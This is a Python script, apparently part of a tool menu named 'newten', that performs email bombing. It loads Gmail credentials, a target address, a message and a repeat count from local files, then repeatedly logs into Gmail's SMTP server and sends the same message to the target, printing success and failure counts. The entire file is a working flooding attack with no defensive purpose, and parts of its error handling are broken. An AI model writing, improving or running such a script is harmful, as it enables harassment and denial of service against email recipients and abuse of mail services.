import smtplib 
import os 
f = open("./content/info/mail_addr.txt", "r") 
maddr = f.read() 
f = open("./content/info/mail_pass.txt", "r") 
mpass = f.read() 
f = open("./content/temp/mbbl_tmpf.txt", "r") 
i = open("./content/temp/mbmsg_tmpf.txt", "r") 
u = open("./content/temp/mbsn_tmpf.txt", "r") 
max = u.read() 
times = 0 
yes = 0 
no = 0 
bombing = f.read() 
msg = i.read() 
def spam(maddr, times, max, no, yes, msg, bombing): 
    try: 
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465) 
        server.login(maddr, mpass) 
        server.sendmail(maddr, bombing, msg) 
        yes = yes + 1 
        os.system("echo [36mnewten/menu/mailbomb/active-$ [92m" + str(times) + "[34m/[92m" + str(max)) 
        f = open("./content/temp/mbry_tmpf.txt", "w") 
        f.write(str(yes - 1)) 
        f.close()         
    except: 
        no = no + 1 
        os.system("echo [36mnewten/menu/mailbomb/active-$ [91m" + str(times) + "[34m/[91m" + str(max)) 
        f = open("./content/temp/mbrn_tmpf.txt", "w") 
        f.write(str(no - 1)) 
        f.close         
    times = times + 1 
    if int(max) >= int(times): 
        spam(maddr, times, max, no, yes, msg, bombing)
    server.quit() 
spam(maddr, times, max, no, yes, msg, bombing) 
f = open("./content/temp/mbry_tmpf.txt", "r") 
yesf = f.read() 
f = open("./content/temp/mbrn_tmpf.txt") 
nof = f.read() 
os.system("echo [36mnewten/menu/mailbomb/ratio-$ [34mMail Ratio...") 
os.system("echo [36mnewten/menu/mailbomb/ratio-$ [92m" + str(yesf) + "[36m:" + "[91m" + str(nof) + "[92m") 
